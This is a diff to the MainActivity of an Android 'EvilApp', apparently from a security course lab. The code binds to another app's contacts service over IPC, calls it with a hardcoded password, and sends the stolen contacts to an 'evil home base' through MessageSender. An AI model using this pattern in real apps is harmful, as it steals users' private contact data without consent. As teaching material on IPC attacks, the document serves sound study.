@@ -20,64 +20,54 @@ public class MainActivity extends Activity {
 	
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-	super.onCreate(savedInstanceState);
-	setContentView(R.layout.activity_main);
-		
-	Button button = (Button) findViewById(R.id.btn_steal_contacts);
+    	super.onCreate(savedInstanceState);
+    	setContentView(R.layout.activity_main);
+    		
+    	Button button = (Button) findViewById(R.id.btn_steal_contacts);
 
-	OnClickListener listen = new OnClickListener() {
-		public void onClick(View v) {
-		    // The following line shows how to use the Log library. 
-		    Log.v(getClass().getSimpleName(), "Got a click of steal contacts button!");
-				
-		    // TODO: Steal the contacts from TrustedApp
-		    stealContacts();
-		}
-	    };
-	
-	button.setOnClickListener(listen);		
+    	OnClickListener listen = new OnClickListener() {
+    		public void onClick(View v) {
+    		    /* The following line shows how to use the Log library. */ 
+    		    Log.v(getClass().getSimpleName(), "Got a click of steal contacts button!");
+    				
+    		    stealContacts();
+    		}
+        };
+    	
+    	button.setOnClickListener(listen);		
     }
 
     /* Use this method to display the contacts in the EvilApp GUI */
     private void showContacts(String contacts) {
-	TextView contactView = (TextView) findViewById(R.id.text_view_contacts);
-	contactView.setText("Contacts:\n" + contacts);
-	
-	// Send the contacts to your evil home base
-	// Please do not remove this call
-	MessageSender m = new MessageSender();
-	m.SendMessage(contacts);
+    	TextView contactView = (TextView) findViewById(R.id.text_view_contacts);
+    	contactView.setText("Contacts:\n" + contacts);
+    	
+    	/* Send the contacts to your evil home base
+    	   Please do not remove this call */
+    	MessageSender m = new MessageSender();
+    	m.SendMessage(contacts);
     }
 
 
     private void stealContacts() {
-	// TODO: your implementation here
-    	this.bindService(new Intent("com.cs155.trustedapp.ReadContactsService"), mConnection, BIND_AUTO_CREATE);
+    	/* IPC call to the TrustedApp's ReadContactsService */
+		this.bindService(new Intent("com.cs155.trustedapp.ReadContactsService"), mConnection, BIND_AUTO_CREATE);
     }
     
     ServiceConnection mConnection = new ServiceConnection() {
-    	public void onServiceDisconnected(ComponentName name) {
-//    		Toast.makeText(Client.this, "Service is disconnected", 1000).show();
-//    		mBounded = false;
-//    		mServer = null;
-    	}
+    	public void onServiceDisconnected(ComponentName name) {}
     	  
-    	public void onServiceConnected(ComponentName name, IBinder service) {
-//    		System.out.println("Here I am now!");
-//    		
+    	public void onServiceConnected(ComponentName name, IBinder ibinder) {
+
     		try {
-    			IGetContactsString ser = IGetContactsString.Stub.asInterface((IBinder)service);
-    			String res = ser.GetContacts("youllnevergetmeluckycharms");
-//    			System.out.println(res);
-    			showContacts(res);
+    			/* Got a binding to the contacts service, cast it to IGetContactsString
+    			   and call the GetContacts method on it to steal the data */
+    			IGetContactsString service = IGetContactsString.Stub.asInterface((IBinder)ibinder);
+    			String contacts = service.GetContacts("youllnevergetmeluckycharms");
+    			showContacts(contacts);
     		}
-    		catch (Exception e){
-    			System.out.println(e);
-    		}
-//    		Toast.makeText(Client.this, "Service is connected", 1000).show();
-//    		mBounded = true;
-//    		LocalBinder mLocalBinder = (LocalBinder)service;
-//    		mServer = mLocalBinder.getServerInstance();
+    		catch (Exception e) { return; }
+
     	}
    };
 }
